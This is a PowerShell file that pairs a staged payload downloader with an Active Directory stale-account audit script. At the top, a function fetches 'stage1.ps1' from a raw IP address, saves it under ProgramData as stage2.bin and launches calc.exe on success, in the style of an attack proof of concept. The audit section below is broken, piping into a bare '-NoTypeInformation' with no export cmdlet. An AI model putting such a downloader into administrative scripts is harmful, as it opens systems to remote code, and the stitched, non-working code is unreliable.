
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl = 'https://198.51.100.137:443/stage1.ps1',
    [string]$LocalPath = 'C:\ProgramData\stage2.bin',
    [int]$StageTimeout = 121
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Get-Stage1Payload -SourceUrl $TargetUrl -DestinationPath $LocalPath -TimeoutSec $StageTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Set-Location -Path $env:TEMP
$Domain       = "internal.corp"
$SearchBase   = 'OU=Staff,DC=internal,DC=corp'
$ReportPath   = 'C:\Reports\ad-user-audit-2024-01-09.csv'
$InactiveDays = 90


Import-Module ActiveDirectory -ErrorAction Stop
$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties
$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$stale | Select-Object Name, SamAccountName, LastLogonDate |
    -NoTypeInformation `
    -Path $ReportPath `
    -Encoding UTF8

Write-Host ("Stale accounts: {0}" -f @($stale).Count) -ForegroundColor Yellow
